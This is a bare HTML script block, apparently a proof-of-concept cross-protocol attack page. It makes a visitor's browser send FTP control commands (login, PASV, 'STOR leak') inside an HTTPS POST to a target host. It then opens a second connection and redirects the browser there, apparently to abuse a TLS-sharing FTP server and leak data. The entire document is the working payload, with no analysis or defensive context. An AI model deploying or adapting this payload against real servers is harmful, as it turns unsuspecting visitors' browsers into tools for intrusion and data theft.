<script>
  const payload =
    'USER bob\r\n' +
    'PASS 12345\r\n' +
    'TYPE I\r\n' +
    'PBSZ 0\r\n' + 
    'PROT P\r\n' +
    'PASV\r\n' +
    'STOR leak\r\n';

  // Body testuale sul canale di controllo (no-cors per evitare preflight)
  fetch('https://target.local', {
    method: 'POST',
    mode: 'no-cors',
    body: payload
  }).catch(() => {});

  // After a few seconds, create a NEW TCP connection to target.local
  // using an image resource (this tends to open a new socket if the POST one is busy)
  setTimeout(() => {
    const img = new Image();
    img.src = 'https://target.local/?t=' + Date.now();
  }, 7000);

  setTimeout(() => {
    window.location = 'https://target.local';
  }, 9000);
</script>